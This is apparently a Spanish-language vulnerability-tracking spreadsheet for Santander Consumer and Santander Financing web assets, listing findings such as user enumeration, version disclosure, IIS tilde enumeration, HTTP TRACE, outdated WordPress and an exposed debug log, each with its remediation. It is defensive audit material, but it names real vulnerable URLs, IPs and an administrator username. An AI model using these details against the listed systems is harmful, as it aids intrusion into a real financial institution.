En caso de usar un e-mail no existente en la aplicación:      Figura 29 - Petición enviando un mail no existente en la aplicación genera un error      Figura 30 - En la respuesta del servidor el mensaje de error explícito "No existe el usuario indicado"       RIESGO   La enumeración de usuarios constituye un riesgo significativo al proporcionar al atacante información valiosa sobre las cuentas existentes en el sistema. Con esta información, un adversario puede optimizar ataques de fuerza bruta concentrándose exclusivamente en usuarios confirmados, aumentando la probabilidad de éxito y reduciendo la detección al evitar intentos sobre cuentas inexistentes. Adicionalmente, las listas de usuarios válidos pueden emplearse para lanzar campañas de phishing dirigido más creíbles, ataques de credential stuffing utilizando credenciales filtradas de otras plataformas, o realizar ingeniería social personalizada. Esta vulnerabilidad reduce sustancialmente las barreras de entrada para comprometer cuentas legítimas y facilita la fase de reconocimiento en ataques más complejos.</t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN   Implementar mensajes de respuesta genéricos e idénticos en la funcionalidad de recuperación de contraseña, independientemente de si el usuario existe o no en el sistema. El mensaje debe ser ambiguo, como "Si el correo electrónico está registrado, recibirás instrucciones para recuperar tu contraseña", evitando revelar la existencia de cuentas específicas.   Normalizar los tiempos de respuesta del sistema para que sean consistentes tanto para usuarios válidos como inválidos, previniendo ataques de análisis de temporización que puedan inferir la existencia de cuentas mediante diferencias en los tiempos de procesamiento.</t>
  </si>
  <si>
    <t>MAN-6957bbe84867435d64d9eea4</t>
  </si>
  <si>
    <t>Fuga de software y versión en errores no controlados</t>
  </si>
  <si>
    <t xml:space="preserve">  DESCRIPCIÓN   Esta vulnerabilidad ocurre cuando una aplicación revela información sensible sobre su infraestructura técnica (nombres de software, versiones específicas, rutas del sistema, configuraciones internas) a través de mensajes de error que no han sido controlados o sanitizados adecuadamente.   DETALLE   Se han identificado varios endpoints que generan un error en servidor y esta es devuelta en la respuesta del mismo. A través de esto es posible identificar las tecnologías implicadas incluso la versión del servidor web usado.   SCBD-25-CNMPO-012-AP-005-001:   En la funcionalidad de la aplicación para restablecer una contraseña olvidada es posible generar un error donde la versión del servidor web es exfiltrada. A continuación se muestra el flujo seguido para reproducir el error:   1. Accede a la funcionalidad para restablecer la contraseña.      Figura 31 - Funcionalidad para restablecer contraseña y PIN      Figura 32 - Se introduce un código de usuario (dirección de e-mail)   A continuación se muestra la petición interceptada y cómo es una respuesta legítima:      Figura 33 - Respuesta legítima del servidor   En caso de usar un e-mail no existente en la aplicación esto genera un error en la misma que exfiltra la versión del servidor web. A continuación se muestran las evidencias:      Figura 34 - Al utilizar una dirección de e-mail no existente en la aplicación esta devuelve un código 500, Internal Server Error   En la misma petición al bajar en la respuesta del servidor es posible identificar que la versión de Apache Tomcat es la 9.0.109.      Figura 35 - Versión de Apache Tomcat exfiltrada   El mismo resultado es obtenido cuando se usa como “código” una dirección de correos no válida. El servidor en este caso devuelve un código 400 pero la versión del servidor web se exfiltra de igual manera.      Figura 36 - Uso de una dirección no válida, código de respuesta 400      Figura 37 - Versión de Apache Tomcat en la respuesta con código 400.   En los logs filtrados en el error es posible identificar que entre las tecnologías usadas se encuentran el framework springs.       SCBD-25-CNMPO-012-AP-005-002:   https://uat.invoway.com/action/verificarClaveCliente   Tras el login correcto el PIN es solicitado:      Figura 38 - Solicitud del PIN tras la autenticación basada en credenciales   Si el tráfico web es interceptado en caso de introducir números de PIN no válidos se genera un error en el servidor:      Figura 39 - Error generado a introducir un PIN no válido      Figura 40 - Versión de Apache Tomcat exfiltrada   SCBD-25-CNMPO-012-AP-005-003:   En la URL https://uat.invoway.com/cliente el servidor devuelve un error interno:      Figura 41 - Error devuelto en el propio navegador   SCBD-25-CGMPO-012-005-004:   En la URL https://uat.invoway.com/jkstatus aparece un error 404 donde se exfiltra la versión del servidor:      Figura 42 - Error devuelto por el servidor a internar acceder a un recurso específico       RIESGOS   Esta información es extremadamente valiosa para un atacante porque le permite:   - Identificar vulnerabilidades conocidas (CVEs) asociadas a versiones específicas   - Planificar ataques dirigidos basados en la tecnología utilizada   - Reducir significativamente el tiempo de reconocimiento   - Explotar debilidades específicas de componentes desactualizados</t>
  </si>
  <si>
    <t xml:space="preserve">  RECOMENDACIÓN   Para mitigar esta vulnerabilidad es fundamental implementar un manejo robusto de errores que muestre únicamente mensajes genéricos al usuario final (como "Ha ocurrido un error, intente nuevamente") sin revelar detalles técnicos. Todos los datos sensibles como versiones de software, trazas de pila, rutas de archivos y consultas SQL deben registrarse exclusivamente en logs internos con acceso restringido. Es esencial desactivar el modo debug en producción, configurar páginas de error personalizadas tanto en la aplicación como en el servidor web, y eliminar encabezados HTTP que expongan información del sistema (como "X-Powered-By" o versiones del servidor). Se recomienda centralizar el manejo de excepciones para garantizar un tratamiento uniforme y realizar auditorías periódicas que verifiquen que ningún mensaje de error filtre información aprovechable por atacantes.</t>
  </si>
  <si>
    <t>Vulnerability description</t>
  </si>
  <si>
    <t>SF</t>
  </si>
  <si>
    <t>BPM</t>
  </si>
  <si>
    <t>QA-WAS-3ad0c84a-5c49-4f65-af27-c8e2f4ab8054</t>
  </si>
  <si>
    <t>Microsoft IIS Tilde Character Information Disclosure Vulnerability</t>
  </si>
  <si>
    <t>https://bpm.santanderconsumer.co/*~1*/a.aspx</t>
  </si>
  <si>
    <t>La vulnerabilidad de divulgación de información del carácter tilde en Microsoft IIS (Internet Information Services) es un problema de seguridad que puede explotarse para divulgar información confidencial sobre la estructura del sistema de archivos de un servidor web.
La vulnerabilidad está relacionada con la forma en que IIS maneja las solicitudes que contienen el carácter tilde (~). En ciertas configuraciones de IIS, un atacante puede aprovechar esta vulnerabilidad para enumerar archivos y directorios en el servidor, incluso si no son accesibles directamente a través de la web. Esto se debe a la forma en que IIS trunca los nombres de archivo largos y utiliza el carácter tilde en los nombres de archivo abreviados resultantes.</t>
  </si>
  <si>
    <t>Para obtener más información sobre cómo abordar la vulnerabilidad, consulte el aviso de Microsoft.
https://techcommunity.microsoft.com/t5/iis-support-blog/iis-short-name-enumeration/ba-p/3951320</t>
  </si>
  <si>
    <t>Al crear solicitudes específicas que contengan el carácter tilde '~', un atacante podría aprovechar esta vulnerabilidad en el servidor web. Si hay directorios o archivos presentes, el atacante podría obtener acceso a ellos. El acceso al contenido podría dar como resultado la revelación de información confidencial al atacante.</t>
  </si>
  <si>
    <t>Jenny Rodriguez
Alexander Parra</t>
  </si>
  <si>
    <t>Autofinance</t>
  </si>
  <si>
    <t>QA-WAS-8248f442-8024-4e19-8e51-745d978c3b54</t>
  </si>
  <si>
    <t>https://autofinance.santanderfinancing.com/vehicle/test.aspx</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios en el servidor web. Según nuestra lógica, se ha confirmado la presencia de estos recursos. Parte del contenido de estos archivos podría contener información confidencial.</t>
  </si>
  <si>
    <t>Se recomienda revisar el contenido de los archivos divulgados. Si el contenido contiene información confidencial, verifique que se permita el acceso a ese archivo o directorio. De ser necesario, elimínelo o aplique controles de acceso al mismo.</t>
  </si>
  <si>
    <t>El contenido de este archivo o directorio puede revelar información confidencial.</t>
  </si>
  <si>
    <t>1° fecha 31/01/2025</t>
  </si>
  <si>
    <t>Jenny Rodriguez</t>
  </si>
  <si>
    <t>Motor</t>
  </si>
  <si>
    <t>QA-WAS-a11a2876-1459-40ce-95f4-b98b6b947d62</t>
  </si>
  <si>
    <t>https://motor.santanderconsumer.co/</t>
  </si>
  <si>
    <t>Los mecanismos de prevención de clickjacking incluyen:
- X-Frame-Options: este encabezado de respuesta HTTP se puede utilizar para evitar el enmarcado de páginas web.
- Content-Security-Policy: la directiva 'frame-ancestors' se puede utilizar para evitar el enmarcado de páginas web.
- Código JavaScript Framekiller diseñado para evitar que un usuario malintencionado enmarque la página. Este método no se recomienda debido a su poca fiabilidad.
Consulte la hoja de trucos de defensa contra el secuestro de clics de OWASP para obtener más información.
Para evitar un error común de implementación de X-Frame-Options, consulte
https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger.</t>
  </si>
  <si>
    <t>QA-WAS-534acfb5-02d1-4014-b640-40e831a9197f</t>
  </si>
  <si>
    <t>https://motor.santanderconsumer.co/?C=S%3BOA</t>
  </si>
  <si>
    <t>Santanderfinancing</t>
  </si>
  <si>
    <t>QA-WAS-820a6769-6dde-4ef7-a393-f411bdeb2412</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/divi-machine/ChangeLog</t>
  </si>
  <si>
    <t>QA-WAS-2832357a-28aa-45c4-a5fa-d8a74dab7a50</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/divi-machine/includes/modules/divi-ajax-filter/includes/modules/MachineLoop/../../../ChangeLog</t>
  </si>
  <si>
    <t>QA-WAS-68052413-3771-42c8-a20d-8327d7b06e32</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/plugins/popups-for-divi/CHANGELOG.txt</t>
  </si>
  <si>
    <t>QA-WAS-a3f1481d-e7b1-457e-81c3-0d0cba90afed</t>
  </si>
  <si>
    <t>https://santanderfinancing.com/wp-content/themes/Divi/ChangeLog.txt</t>
  </si>
  <si>
    <t>QA-VM-3440952502986906853</t>
  </si>
  <si>
    <t>motor.santanderconsumer.co</t>
  </si>
  <si>
    <t>Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo.
Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. 
La importancia de la capacidad de rastreo en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta de rastreo. 
Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables.
Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo.
Track / Trace deben estar desactivados para cumplir con la normativa PCI.</t>
  </si>
  <si>
    <t>A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor.
Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond %{REQUEST_METHOD} ^TRACE
RewriteRule .* - [F]
&lt;/IfModule&gt;
Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original.
Una solución un poco más estricta es usar
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$
RewriteRule .* - [F]
&lt;/IfModule&gt;
Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable.
En el httpd.conf añada o modifique:
TraceEnable Off
Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro.
URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control.
Para más detalles sobre otros servidores web: Cert Advisory.</t>
  </si>
  <si>
    <t>1° Fecha: 28/02/2025
2° Fecha: 30/05/2025</t>
  </si>
  <si>
    <t>QA-VM--8691741700771998703</t>
  </si>
  <si>
    <t>El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly.
Es necesario desactivar Track / Trace para cumplir con la normativa PCI.</t>
  </si>
  <si>
    <t>Desactive estos métodos en el archivo de configuración de su servidor web.</t>
  </si>
  <si>
    <t>QA-VM--2097320269514817275</t>
  </si>
  <si>
    <t>QA-VM--5280544726994357519</t>
  </si>
  <si>
    <t>Este QID informa de la ausencia de las siguientes cabeceras HTTP según CWE-693: Fallo del mecanismo de protección:
X-Frame-Options: Esta cabecera de respuesta HTTP mejora la protección de las aplicaciones web contra ataques de clickjacking. El clickjacking, también conocido como «ataque de redireccionamiento de la interfaz de usuario», permite a un atacante utilizar múltiples capas transparentes u opacas para engañar a un usuario objetivo para que haga clic en un botón o enlace de otra página cuando su intención era hacer clic en la página de nivel superior. 
Protección X-XSS: Esta cabecera HTTP habilita el filtro Cross-Site Scripting (XSS) integrado en el navegador para evitar ataques de secuencias de comandos entre sitios. Protección X-XSS: 0; desactiva esta funcionalidad.
X-Content-Type-Options: Esta cabecera HTTP evita ataques basados en la no coincidencia de tipo MIME. El único valor posible es nosniff. Si su servidor devuelve X-Content-Type-Options: nosniff en la respuesta, el navegador se negará a cargar los estilos y scripts en caso de que tengan un tipo MIME incorrecto. 
Strict-Transport-Security: El encabezado de respuesta HTTP Strict-Transport-Security (HSTS) es una característica de seguridad que permite a un sitio web indicar a los navegadores que sólo se debe comunicar con él utilizando HTTPS, en lugar de HTTP.</t>
  </si>
  <si>
    <t>Se recomienda a los clientes que configuren correctamente las cabeceras de respuesta HTTP X-Frame-Options, X-XSS-Protection, X-Content-Type-Options y Strict-Transport-Security.
Dependiendo del software de su servidor, los clientes pueden establecer directivas en la configuración de su sitio o en los archivos Web.config. Algunos ejemplos son
X-Frame-Options:
Apache: Header always append X-Frame-Options SAMEORIGIN
nginx: add_header X-Frame-Options SAMEORIGIN;
HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN
IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME=«X-Frame-Options» VALUE=«SAMEORIGIN»&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt;
X-XSS-Protection:
Apache: Header always set X-XSS-Protection «1; mode=block» 
PHP: header(«X-XSS-Protection: 1; mode=block»);
X-Content-Type-Options:
Apache: Header always set X-Content-Type-Options: nosniff
HTTP Strict-Transport-Security:
Apache: Header always set Strict-Transport-Security «max-age=31536000; includeSubDomains»
Nginx: add_header Strict-Transport-Security max-age=31536000;
Nota: Los dispositivos de red que incluyen una consola HTTP/HTTPS para fines administrativos/de gestión a menudo no incluyen todas/algunas de las cabeceras de seguridad. Se trata de un problema conocido y se recomienda ponerse en contacto con el proveedor para obtener una solución.</t>
  </si>
  <si>
    <t>QA-VM-8145157804596662078</t>
  </si>
  <si>
    <t>santanderfinancing.com</t>
  </si>
  <si>
    <t>QA-VM--3128715605565930976</t>
  </si>
  <si>
    <t>QA-VM-3127236777467466448</t>
  </si>
  <si>
    <t>autofinance.santanderfinancing.com</t>
  </si>
  <si>
    <t>1° Fecha 31/01/2025</t>
  </si>
  <si>
    <t>QA-VM--3067624496152491302</t>
  </si>
  <si>
    <t xml:space="preserve">Se esta en proceso de baja del servicio </t>
  </si>
  <si>
    <t>Simplefinance</t>
  </si>
  <si>
    <t>MAN-668e288787e64843c1d54e31</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-010-VE-001</t>
  </si>
  <si>
    <t>simplefinance.santanderfinancing.com</t>
  </si>
  <si>
    <t>Se ha comprobado que la página web se está alojando en un servidor Apache con la versión v2.4.58 y con la librearía OpenSSLL 1.0.2k-fips que se encuentran desactualizadas.</t>
  </si>
  <si>
    <t>Se recomienda utilizar versiones actualizadas del software utilizado por la aplicación y/o infraestructura. En caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada se recomienda instalar los parches de seguridad específicos que pongan en riesgo la seguridad del sistema.</t>
  </si>
  <si>
    <t>Un atacante podría identificar el software utilizado por la aplicación con la finalidad de explotar alguna vulnerabilidad conocida para tomar el control del sistema.</t>
  </si>
  <si>
    <t>MFT</t>
  </si>
  <si>
    <t>MAN-66621b583d46490637ec5b1b</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-006-AP-001</t>
  </si>
  <si>
    <t>Test EICAR de subida de ficheros fallido</t>
  </si>
  <si>
    <t>mft.santanderconsumer.co</t>
  </si>
  <si>
    <t>Durante los análisis realizados se ha observado la posibilidad de subir ficheros no autorizados y/o maliciosos sin que el sistema notifique ningún problema o error.
En este caso en concreto se ha empleado un fichero en formato .docx (Word) el cual contiene una prueba de concepto de una macro maliciosa. La ejecución de esta macro maliciosa abre un CMD y ejecuta la función “echo” mostrando un simple mensaje.</t>
  </si>
  <si>
    <t>Se recomienda establecer un paso intermedio en el proceso de la subida de ficheros, por ejemplo, implementar un sistema de tipo "sandbox" donde se analice el archivo subido en busca de malware.</t>
  </si>
  <si>
    <t>Las consecuencias de una subida de ficheros arbitraria pueden ser varias, desde el control total del sistema, ejecución remota de comandos, sobrecarga del sistema de ficheros o de la base de datos, realización de ataques a otros activos del back-end, llevar a cabo un simple "defacement" o utilizar la aplicación para almacenar ficheros con malware.</t>
  </si>
  <si>
    <t>MAN-665f00593d46490637e0dc8e</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-002-AP-001</t>
  </si>
  <si>
    <t>https://bpm.santanderconsumer.co:8001/OriginacionPROD/</t>
  </si>
  <si>
    <t>1° Fecha 31/01/2025
2° Fecha: 30/05/2025</t>
  </si>
  <si>
    <t>MAN-66547ecbc382686af2c855fd</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-001-CO-001</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha observado cómo la aplicación devuelve información relativa sobre el servidor y la versión.
Esta información es mostrada en la página por defecto de Apache a la que se accede en el directorio raíz del dominio motor.santanderconsumer.co.
Además, esta información también es revelada en la cabecera ‘Server’ devuelta en las respuestas procedentes del servidor.</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del servidor web que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable.</t>
  </si>
  <si>
    <t>MAN-66546c5fc382686af2c855f6</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-005-VE-001</t>
  </si>
  <si>
    <t>Uso de software vulnerable</t>
  </si>
  <si>
    <t>El activo afectado hace uso de Wordpress 6.4.1. Esta versión tiene asociada las siguientes vulnerabilidades:
- WP &lt; 6.5.2 - Unauthenticated Stored XSS 
- WordPress &lt; 6.4.3 - Deserialization of Untrusted Data 
- WordPress &lt; 6.4.3 - Admin+ PHP File Upload 
- WP 6.4-6.4.1 - POP Chain
Los detalles de las vulnerabilidades públicas de esta versión del software se pueden consultar en los siguientes enlaces:
• WP 6.4-6.4.1 - POP Chain
- https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3b
- https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/
• WordPress &lt; 6.4.3 - Deserialization of Untrusted Data
- https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
- https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
• WordPress &lt; 6.4.3 – Admin + PHP File Upload - CVE-2024-31210
- https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
- https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
• WP &lt; 6.5.2 - Unauthenticated Stored XSS - CVE-2024-4439
- https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
- https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/</t>
  </si>
  <si>
    <t>Se recomienda actualizar a la versión 6.5.3 de Wordpress, ya que es la más reciente a fecha de este informe y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades. Dicha versión puede ser descargada desde el siguiente enlace: https://wordpress.org/latest.zip</t>
  </si>
  <si>
    <t>El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante las vulnerabilidades mencionadas anteriormente, lo cual puede poner en riesgo al activo afectado.</t>
  </si>
  <si>
    <t>MAN-66546d9ac382686af2c855f7</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-005-CO-002</t>
  </si>
  <si>
    <t>Fichero wp-cron.php expuesto</t>
  </si>
  <si>
    <t>El fichero wp-cron.php es el responsable de los eventos programados en un sitio web de WordPress. De forma predeterminada, cuando se realiza una solicitud, WordPress generará una solicitud adicional al archivo wp-cron.php. Al generar un gran número de solicitudes al sitio web, es posible hacer que el sitio realice un ataque DoS contra sí mismo.
Se ha detectado que el fichero wp-cron.php está expuesto en Internet.</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar y restringir el acceso al fichero wp-cron.php. Para ello añadir la siguiente variable en el fichero wp-config.php:
• DISABLE_WP_CRON=true</t>
  </si>
  <si>
    <t>La exposición del fichero wp-cron.php puede suponer un riesgo ya que un atacante puede comprometer la disponibilidad del sitio debido a que es posible aumentar el consumo del proceso de Wordpress realizando numerosas peticiones a este fichero, provocando una denegación de servicio. Para esta vulnerabilidad existe un exploit público. El exploit no ha sido ejecutado contra el activo ya que incumple los puntos acordados en el contrato de Deloitte.</t>
  </si>
  <si>
    <t>1° Fecha: 28/02/2025</t>
  </si>
  <si>
    <t xml:space="preserve">Solventada/pendiente de certificación </t>
  </si>
  <si>
    <t>MAN-654e2b58f74e327f9d115ec6</t>
  </si>
  <si>
    <t>SC-23-CNMPO-009-VE-001</t>
  </si>
  <si>
    <t>CVE-2023-0286
CVE-2022-4304
CVE-2022-4203
CVE-2016-0736
CVE-2016-2161
CVE-2017-9798</t>
  </si>
  <si>
    <t>Se ha detectado que el activo afectado posee unas versiones de OpenSSL y Apache con vulnerabilidades públicas asociadas.
Los detalles de las vulnerabilidades públicas de esta versión de OpenSSL se pueden consultar en los siguientes enlaces:
https://www.cybersecurity-help.cz/vdb/openssl_software_foundation/openssl/1.0.2k/
Los detalles de las vulnerabilidades públicas de esta versión de Apache se pueden consultar en los siguientes enlaces:
https://vulmon.com/searchpage?q=apache+http+server+2.4.6</t>
  </si>
  <si>
    <t>Se recomienda actualizar las versiones de OpenSSL y Apache y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades. Las últimas versiones de OpenSSL y Apache pueden ser descargadas desde el siguiente enlace: 
• https://www.openssl.org/source/ 
• https://httpd.apache.org/download.cgi</t>
  </si>
  <si>
    <t>El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante vulnerabilidades conocidas, lo cual puede poner en riesgo al activo afectado.</t>
  </si>
  <si>
    <t>MAN-651c2a96f74e327f9d0a2f05</t>
  </si>
  <si>
    <t>SC-23-CNMPA-004-AP-007</t>
  </si>
  <si>
    <t>Acceso a ficheros Log del servidor</t>
  </si>
  <si>
    <t>Se ha detectado que es posible acceder a un archivo log del servidor. Este expone rutas internas del servidor, archivos que están presentes en la máquina, plugins de Wordpress que han sido instalados, entre otra información de interés para un atacante.
santanderfinancing.com/0yqtb4fy5hutpda/debug.log</t>
  </si>
  <si>
    <t>Eliminar todos los archivos log del servidor cuyo mantenimiento no sea indispensable para el funcionamiento del aplicativo.
Adicionalmente, para aquellos ficheros que sea indispensable mantener, su acceso debe estar protegido y restringido a los usuarios necesarios.</t>
  </si>
  <si>
    <t>Conocer este tipo de información, puede ayudar a un atacante a localizar vulnerabilidades conocidas con el software instalado o ayudarle a planificar ataques más elaborados contra la plataforma. Por ejemplo, las rutas donde se sitúan los archivos accesibles por el servidor Xampp son fácilmente identificables visualizando el fichero Log.</t>
  </si>
  <si>
    <t>MAN-651c2afef74e327f9d0a2f06</t>
  </si>
  <si>
    <t>SC-23-CNMPA-004-AP-008</t>
  </si>
  <si>
    <t>Acceso a páginas no enlazadas</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha podido comprobar que existen varias páginas residuales no enlazadas con el resto de la aplicación.
A continuación, se muestran algunos ejemplos:
• https://santanderfinancing.com/prueba:
https://santanderfinancing.com/comercios_aliados/cliente-02/:
*En este ejemplo se puede observar cómo se expone el nombre del usuario administrador de Wordpress adminSantanderConsumer.
Se recomienda visualizar todas las páginas accesibles desde la red pública a través de las siguientes URL:
• https://santanderfinancing.com/page-sitemap.xml
• https://santanderfinancing.com/sitemap_index.xml
Una vez visualizadas, se deberían eliminar todas aquellas que sean pruebas, que hayan quedado desactualizadas o que ya no sean útiles para el usuario.</t>
  </si>
  <si>
    <t>Se recomienda eliminar todas las páginas residuales o limitar su acceso desde la red pública. En tales condiciones, solo deberían quedar aquellas que sean indispensables para dar el servicio al usuario. Como medida adicional, también se recomienda deshabilitar las funcionalidades de la aplicación que no sean estrictamente necesarias para el correcto funcionamiento de esta.</t>
  </si>
  <si>
    <t>Las páginas residuales suponen un riesgo de cara a la aplicación, debido a que se aumenta la superficie de ataque y se facilita la exposición de información de interés para el atacante. Todo esto sucede sin que aporten valor alguno al funcionamiento del aplicativo o a la experiencia del usuario.</t>
  </si>
  <si>
    <t>MAN-651adb37f74e327f9d0a09af</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-AP-006</t>
  </si>
  <si>
    <t>https://190.85.213.99:4443/SimpleFinance/login</t>
  </si>
  <si>
    <t xml:space="preserve">El aplicativo o servicio permite conocer la existencia de nombres de usuario en el sistema. Este comportamiento se puede producir de dos maneras distintas: 
• El aplicativo o servicio muestra mensajes distintos que permiten discernir si un determinado usuario es un usuario válido en el sistema o aplicación afectada.}
• El aplicativo o servicio permite recuperar o acceder al listado de los usuarios dados de alta de manera total o parcial
Durante las pruebas realizadas se ha comprobado que la aplicación devuelve un mensaje de error indicando que el usuario no existe al modificar el parámetro “params”.
</t>
  </si>
  <si>
    <t>Se recomienda que el aplicativo no permita proporcionar un listado de usuario presentes en el sistema a roles que no sean administrativos. Así mismo, se recomienda no proporcionar evidencias que nos permitan discernir si el usuario introducido está dado de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de respuesta de la aplicación, tal y como hemos identificado en el alcance de las presentes pruebas.</t>
  </si>
  <si>
    <t>Esta debilidad podría ser utilizada por un atacante para intentar obtener un listado de los usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de contraseñas, ataques de phishing, ataques de fuerza bruta o "password spraying" sobre las contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna cuenta de usuario o administrador.</t>
  </si>
  <si>
    <t>Factoring</t>
  </si>
  <si>
    <t>MAN-65129c97f74e327f9d0969f7</t>
  </si>
  <si>
    <t>SC-23-CNMPO-001-CO-003</t>
  </si>
  <si>
    <t>Certificado SSL caducado</t>
  </si>
  <si>
    <t>https://64.76.176.202/factoring/index.seam</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha podido comprobar que el certificado utilizado para proporcionar comunicaciones cifradas entre los navegadores del cliente y el servidor web se encuentra caducado.</t>
  </si>
  <si>
    <t>Se recomienda sustituir el certificado caducado por un certificado válido expedido por una “Autoridad de Certificación” (CA) confiable. De manera adicional, se recomienda contar con un protocolo de renovación de certificados, estableciendo fechas de renovación de los mismos y alertando de la caducidad de los certificados de manera previa para poder iniciar los trámites necesarios de la renovación de los mismos.</t>
  </si>
  <si>
    <t>Un atacante podría aprovechar que los mensajes de error de certificado caducado y de certificado no válido son similares para presentar su propio certificado y aprovechar el desconcierto de ciertos usuarios al aceptar el certificado del atacante como válido. De esta manera el atacante puede realizar un ataque de Man in The Middle y acceder a la información transmitida en texto claro.</t>
  </si>
  <si>
    <t>MAN-6512e698f74e327f9d096a21</t>
  </si>
  <si>
    <t>SC-23-CNMPO-001-AP-007</t>
  </si>
  <si>
    <t>4</t>
  </si>
  <si>
    <t>MAN-6512c75ef74e327f9d0969f8</t>
  </si>
  <si>
